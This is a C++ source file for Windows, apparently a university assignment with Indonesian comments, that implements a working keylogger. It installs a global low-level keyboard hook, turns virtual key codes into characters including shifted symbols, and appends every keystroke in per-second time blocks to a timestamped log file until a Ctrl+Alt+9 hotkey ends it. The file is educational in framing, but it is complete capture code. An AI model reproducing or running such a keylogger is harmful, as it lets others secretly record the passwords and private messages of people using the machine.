/*  -------------------------------
	Nama	: Raihan Maulana Warman
	NIM		: 13514076
	-------------------------------
	Nama	: Albertus Kelvin
	NIM		: 13514100
	-------------------------------
*/

/** Eksplorasi system call dengan WinAPI dalam bahasa C++ **/

#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <time.h>
#include <iostream>
#include <string.h>

using namespace std;

/** KAMUS GLOBAL **/
time_t now = time(0); 	// mengambil waktu sistem (lokal) sekarang

char output[50];		// variabel untuk menyimpan nama file teks

/* variabel penyimpan waktu secara periodik untuk pembagian log time */
int dyn_tahun, dyn_bulan, dyn_hari;
int dyn_jam, dyn_menit, dyn_detik;

int stat_judul = 1;
int stat_ketik = 1;

/* variabel penyimpan status penambah angka 0 jika bilangan itu kurang dari 10 
	contoh: 8 ditulis 08, 9 ditulis 09, dan 12 ditulis 12 
*/
int plus_zero_bulan = 0, plus_zero_hari = 0;
int plus_zero_jam = 0, plus_zero_menit = 0, plus_zero_detik = 0;	

/** FUNGSI-PROSEDUR **/
int isCapsLock() {
	// Fungsi untuk mengecek kondisi nyala/tidaknya Caps Lock (representasi dengan virtual key Capital)
    if (!((GetKeyState(VK_CAPITAL) & 0x0001)!=0))
       return 0;
    else
       return 1;    
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {    
    /* Tipe struct (struktur) yang menjadi pusat aktivitas perekaman keystroke untuk kemudian dibagi menjadi beberapa 
       time block di file eksternal. Perekaman keystroke menggunakan representasi virtual key dan ASCII.
    */

	/** KAMUS LOKAL **/
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        // struktur yang menyimpan informasi mengenai aksi input dari keyboard
        // salah satu field nya adalah vkCode yang bertipe DWORD

    FILE *file;
        // deklarasi variabel file eksternal

    DWORD dwMsg = 1;
	
	char val[5];
	
	int yeartahun, montbulan, dayhari;
	int hourjam, minmenit, secdetik;
	char yeararr[5], montarr[3], dayarr[3];
	char hourarr[3], minarr[3], secarr[3];
	
	int jam_to_detik, menit_to_detik, total_detik_1, total_detik_2;

	/** ALGORITMA **/
    file = fopen(output,"a+");          
        // parameter output sudah berisi waktu dan tanggal sistem (lokal)
        // parameter a+ digunakan untuk prosedur append
	
	if (stat_judul == 1) {
		fputs("Hasil rekaman keystroke per detik\n", file);
		fputs("---------------------------------", file);
		stat_judul = 0;
	}
	
    switch (wParam) {
        // Mengecek pesan yang dibawa oleh parameter WPARAM yang berisi informasi mengenai handle
        // dalam hal ini handle itu berupa aksi keystroke pada keyboard

        case WM_KEYDOWN: 
        {
            // Kondisi ini akan dijalankan jika tombol keyboard ditekan
            
            // Men-assign virtual key code (vkCode) yang didapat dari struktur KBDLLHOOKSTRUCT ke variabel lokal bertipe DWORD
            DWORD vkCode = pKeyBoard->vkCode;
    
			// Inisialisasi variabel plus_zero_x
			plus_zero_bulan = 0;
			plus_zero_hari = 0;
			plus_zero_jam = 0;
			plus_zero_menit = 0;
			plus_zero_detik = 0;
	
			// Mengambil nilai waktu lokal sistem
			time_t dyn_now = time(0);
			tm *ltm = localtime(&dyn_now);
			
			// Men-assign nilai tahun secara periodik 
			yeartahun = 1900 + ltm->tm_year;
			
			// Men-assign nilai bulan secara periodik 
			montbulan = 1 + ltm->tm_mon;
			if (montbulan < 10) {
				plus_zero_bulan = 1;
			}
			
			// Men-assign nilai hari secara periodik 
			dayhari = ltm->tm_mday;
			if (dayhari < 10) {
				plus_zero_hari = 1;
			}
			
			// Men-assign nilai jam secara periodik 
			hourjam = ltm->tm_hour;
			if (hourjam < 10) {
				plus_zero_jam = 1;
			}
			
			// Men-assign nilai menit secara periodik 
			minmenit = 1 + ltm->tm_min;
			if (minmenit < 10) {
				plus_zero_menit = 1;
			}
			
			// Men-assign nilai detik secara periodik
			secdetik = 1 + ltm->tm_sec;
			if (secdetik < 10) {
				plus_zero_detik = 1;
			}
			
			// Mengubah integer waktu ke string waktu 
			itoa(yeartahun, yeararr, 10);
			itoa(montbulan, montarr, 10);
			itoa(dayhari, dayarr, 10);
			itoa(hourjam, hourarr, 10);
			itoa(minmenit, minarr, 10);
			itoa(secdetik, secarr, 10);
            
            // Proses pembagian block time untuk kondisi setiap detik waktu lokal
			if (secdetik != dyn_detik) {
				fputs("\n\n", file);
				fputs(yeararr, file);
				fputs(":", file);
				if (plus_zero_bulan == 1) {
					fputs("0", file);
				}
				fputs(montarr, file);
				fputs(":", file);
				if (plus_zero_hari == 1) {
					fputs("0", file);
				}
				fputs(dayarr, file);
				fputs("-", file);
				if (plus_zero_jam == 1) {
					fputs("0", file);
				}
				fputs(hourarr, file);
				fputs(":", file);
				if (plus_zero_menit == 1) {
					fputs("0", file);
				}
				fputs(minarr, file);
				fputs(":", file);
				if (plus_zero_detik == 1) {
					fputs("0", file);
				}
				fputs(secarr, file);
				
				// Konversi waktu ke dalam detik 
				jam_to_detik = hourjam * 3600;
				menit_to_detik = minmenit * 60;
				total_detik_1 = jam_to_detik + menit_to_detik + secdetik;
				
				jam_to_detik = dyn_jam * 3600;
				menit_to_detik = dyn_menit * 60;
				total_detik_2 = jam_to_detik + menit_to_detik + dyn_detik;
				
                // Menampilkan pesan [Start] yang menyatakan kapan aksi pengetikkam oleh user dilakukan
				if (stat_ketik == 1) {
						fputs(" [Start]", file);
						stat_ketik = 0;
				} else {
					if (total_detik_1 - total_detik_2 > 1) {
						fputs(" [Start]", file);
					} 
				}
				
                // Assign nilai waktu periodik menjadi waktu lokal
				dyn_detik = secdetik;
				dyn_menit = minmenit;
				dyn_jam = hourjam;
				
				
				fputs("\n", file);
			}
			
            if ((vkCode>=39)&&(vkCode<=64)) {
                // Pengecekan kondisi jika menekan tombol 0 - 9

                if (GetAsyncKeyState(VK_SHIFT)) {
                    // Mengecek jika tombol Shift ditekan (nilai GetAsyncKeyState = true)
                    // Jika ditekan berarti user mengetikkan simbol selain angka yang berada di tombol 0-9
                    // Contoh: * & ^ % $ 

					switch (vkCode) {
                        // Nilai 0x30 - 0x39 adalah nilai/konstanta virtual key code untuk tombol keyboard 0-9 (berurutan)

                        case 0x30:                  // saat mengetik tombol [SHIFT]+0 yang hasilnya )
                            fputs(")",file);            
						  break;
                        case 0x31:                  // saat mengetik tombol [SHIFT]+1 yang hasilnya !
                            fputs("!",file);
                            break;
                        case 0x32:                  // saat mengetik tombol [SHIFT]+2 yang hasilnya @
                            fputs("@",file); 
                            break;
                        case 0x33:                  // ...
                            fputs("#",file);  
                            break;
                        case 0x34:                  // ...
                            fputs("$",file);   
                            break;
                        case 0x35:                  // ...
                            fputs("%",file);  
                            break;
                        case 0x36:                  // ...
                            fputs("^",file);  
                            break;
                        case 0x37:                  // ...
                            fputs("&",file);  
                            break;
                        case 0x38:                  // ...
                            fputs("*",file);  
                            break;
                        case 0x39:                  // saat mengetik tombol [SHIFT]+9 yang hasilnya (
                            fputs("(",file);  
                            break;
                    }
                }
                else {
                    // Kondisi jika tombol Shift tidak ditekan
                    // maka yang diketikkan adalah nomor 0-9
                    sprintf(val,"%c",vkCode);
                    fputs(val,file);  
                }
            }
            else if ((vkCode>64)&&(vkCode<91)) {
                // Pengecekan kondisi jika menekan tombol a-z
                
                if (!(GetAsyncKeyState(VK_SHIFT)^isCapsLock())) {
                    // Mengecek apakah yang diketikkan merupakan huruf kecil (non-kapital)

                    /* Contoh kasus:
                            User menekan [SHIFT]+'tombol a' tanpa menyalakan Caps Lock dan dihasilkan A
                            Ini berarti nilai aksi [SHIFT] = 1 dan aksi Caps Lock = 0 dan aksi kapital = 1

                            Kemungkinan lainnya adalah [SHIFT]=1->CapsLock=1->kapital=0
                            [SHIFT]=0->CapsLock=1->kapital=1, dst...

                            Bisa dilihat jika kapital=1, maka non-kapital=0. Begitu juga sebaliknya

                        Dalam kasus ini, nilai aksi [SHIFT] diwakili oleh GetAsyncKeyState dan CapsLock oleh isCapsLock()
                        Artinya, kondisi IF ini akan dijalankan hanya untuk jika nilai kapital=0 dan non-kapital=1
                    */
                    vkCode+=32; 
                }

                // Sisanya tinggal dijadikan output
                sprintf(val,"%c",vkCode);
                fputs(val,file);  
            }
            else {
                switch (vkCode) {
                    // Mengecek tombol lainnya selain 0-9 dan a-z
                    // Jika tombol itu mengandung lebih dari 1 karakter, maka dipanggil GetAsyncKeyState untuk
                    // virtual key [SHIFT] untuk menentukan karakter mana yang dipilih

                    case VK_SPACE:
                        fputs("[Space]",file);
                        break;
                    case VK_LCONTROL:
                    case VK_RCONTROL:
                        fputs("[Ctrl]",file);
                        break;
                    case VK_LMENU:
                    case VK_RMENU:
                        fputs("[Alt]",file);
                        break;
                    case VK_INSERT:
                        fputs("[Insert]",file);
                        break;
                    case VK_DELETE:
                        fputs("[Del]",file);
                        break;
                    case VK_NUMPAD0:
                        fputs("0",file);
                        break;
                    case VK_NUMPAD1:
                        fputs("1",file);
                        break;
                    case VK_NUMPAD2:
                        fputs("2",file);
                        break;
                    case VK_NUMPAD3:
                        fputs("3",file);
                        break;
                    case VK_NUMPAD4:
                        fputs("4",file);
                        break;
                    case VK_NUMPAD5:
                        fputs("5",file);
                        break;
                    case VK_NUMPAD6:
                        fputs("6",file);
                        break;
                    case VK_NUMPAD7:
                        fputs("7",file);
                        break;
                    case VK_NUMPAD8:
                        fputs("8",file);
                        break;
                    case VK_NUMPAD9:
                        fputs("9",file);
                        break;
                    case VK_OEM_2:                              // bervariasi untuk setiap jenis keyboard
                        if (GetAsyncKeyState(VK_SHIFT))
                             fputs("?",file);                   // jika menekan [SHIFT]+[/?] maka hasilnya ?
                        else
                             fputs("/",file);                   // jika menekan [/?] maka hasilnya /
                        break;
                    case VK_OEM_3:                              // bervariasi untuk setiap jenis keyboard
                        if (GetAsyncKeyState(VK_SHIFT))
                             fputs("~",file);
                        else
                             fputs("`",file);
                        break;
                    case VK_OEM_4:                              // bervariasi untuk setiap jenis keyboard, DST.....
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("{",file);
                         else
                            fputs("[",file);
                         break;
                    case VK_OEM_5:
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("|",file);
                         else
                            fputs("\\",file);
                         break;
                    case VK_OEM_6:
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("}",file);
                         else
                            fputs("]",file);
                         break;
                    case VK_OEM_7:
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("\\",file);
                         else
                            fputs("'",file);
                         break;
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                        // do nothing;
                        break;
                    case 0xBC:                  // Untuk koma. Bisa juga memakai VK_OEM_COMMA     
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("<",file);
                         else 
                            fputs(",",file);
                         break;
                    case 0xBE:                  // Untuk titik. Bisa juga memakai VK_OEM_PERIOD
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs(">",file);
                         else
                            fputs(".",file);
                         break;
                    case 0xBA:                  // Untuk titik koma. Bisa juga memakai VK_OEM_1
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs(":",file);
                         else
                            fputs(";",file);
                         break;
                    case 0xBD:                  // Untuk tanda minus
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("_",file);
                         else
                            fputs("-",file);
                         break;
                    case 0xBB:                  // Untuk tanda sama dengan
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("+",file);
                         else
                            fputs("=",file);
                         break;
                    default: 
                        dwMsg += pKeyBoard->scanCode << 16;
                        dwMsg += pKeyBoard->flags << 24;
        
                        char key[16];                       // Deklarasi sebuah buffer bernama 'key' dengan ukuran 16 (termasuk \0)
                        GetKeyNameText(dwMsg,key,15);       // Memanggil sebuah string yang mewakili nama kunci selain kasus2 di atasnya
                        fputs(key,file);            
                }
            }
        }
        default:
            fclose(file);
            return CallNextHookEx( NULL, nCode, wParam, lParam );
                // Memanggil sebuah sesi lain untuk perekaman keystroke selanjutnya
    }
    
    fclose(file);
    return 0;    
}
   
DWORD WINAPI KeyLogger(LPVOID lpParameter) {
    // Fungsi ini dipanggil oleh MAIN untuk meng-install WinHOOK

    HHOOK hKeyHook;  
    
    HINSTANCE hExe = GetModuleHandle(NULL);         
        // Fungsi ini akan mengembalikan sebuah nilai berupa handle jika berhasil. Jika gagal, mengembalikan NULL
    
    if(hExe == NULL) {
       return 1;           
    }
    else {
         hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)LowLevelKeyboardProc, hExe, 0);
            // Meng-install sebuah prosedur API yang biasa disebut HOOK
            // WH_KEYBOARD_LL sebagai parameter ke-1 merupakan jenis prosedur yang ingin diinstall
            // WH_KEYBOARD_LL digunakan untuk merekam keystroke
            // Parameter ke-2 digunakan sebagai pointer terhadap WH_KEYBOARD_LL

         RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);
         
         MSG msg; 
         
         // Mengambil sebuah pesan dari HotKey yang sudah diregistrasi
         while (GetMessage(&msg, NULL, 0, 0) != 0) {
                if (msg.message == WM_HOTKEY) {
                    // Jika tombol WM_HOTKEY yang sudah diregistrasi ditekan, maka program menjalankan prosedur exit
                    UnhookWindowsHookEx(hKeyHook);                
                    return 0;
                }
               
                TranslateMessage(&msg);
                    // Konversi pesan virtual key ke dalam bentuk pesan karakter
               
               DispatchMessage(&msg);       
                    // Setelah konversi, program mengirimkan pesan karakter itu ke prosedur Hook
         }
         
	     UnhookWindowsHookEx(hKeyHook);
            // Menghapus prosedur Hook yang telah diinstall 
    }       
    return 0;
}

/** FUNGSI UTAMA (MAIN) **/
int main(int argc, char* argv[])
{
	/** KAMUS LOKAL **/
    HANDLE hThread;
	DWORD dwThread;
	
	/** ALGORITMA **/

    /* Proses pembentukan nama file teks dalam format YYYYMMDD-HHMMSS.txt */
	tm *ltm = localtime(&now);

	int tahun = 1900 + ltm->tm_year; 
	int bulan = 1 + ltm->tm_mon;
	if (bulan < 10) {
		plus_zero_bulan = 1;
	}
	int hari  = ltm->tm_mday;
	if (hari < 10) {
		plus_zero_hari = 1;
	}
	
	int jam	 = ltm->tm_hour;
	if (jam < 10) {
		plus_zero_jam = 1;
	}
	int menit = 1 + ltm->tm_min;
	if (menit < 10) {
		plus_zero_menit = 1;
	}
	int detik = 1 + ltm->tm_sec;
	if (detik < 10) {
		plus_zero_detik = 1;
	}
	
	//Inisialisasi variabel dyn_ dengan tahun, bulan, dst...
	dyn_tahun = tahun;
	dyn_bulan = bulan;
	dyn_hari = hari;
	dyn_jam = jam;
	dyn_menit = menit;
	dyn_detik = detik;
	
	char year[5], Month[3], Day[3], Hour[3], Minute[3], Second[3];
	
    // Konversi integer waktu ke dalam string waktu
    itoa(tahun, year, 10);
	itoa(bulan, Month, 10);
	itoa(hari, Day, 10);
	itoa(jam, Hour, 10);
	itoa(menit, Minute, 10);
	itoa(detik, Second, 10);
	//char output[50];

	strcpy(output, year);
	if (plus_zero_bulan == 1) {
		strcat(output, "0");
	}
	strcat(output, Month);
	if (plus_zero_hari == 1) {
		strcat(output, "0");
	}
	strcat(output, Day);
	strcat(output, "-");
	if (plus_zero_jam == 1) {
		strcat(output, "0");
	}
	strcat(output, Hour);
	if (plus_zero_menit == 1) {
		strcat(output, "0");
	}
	strcat(output, Minute);
	if (plus_zero_detik == 1) {
		strcat(output, "0");
	}
	strcat(output, Second);
	strcat(output, ".txt");
	
    hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)KeyLogger, (LPVOID) argv[0], 0, NULL); 
        // Fungsi ini mengembalikan nilai berupa handle jika berhasil. Jika gagal akan mengembalikan NULL
        // Fungsi ini juga akan memulai proses perekaman keystroke dengan memanggil DWORD WINAPI KeyLogger

    if (hThread) {         
       return WaitForSingleObject(hThread,INFINITE);
    }
    else {
        // Jika mengembalikan NULL, maka keluar dari MAIN
	   return 1;
    }
}
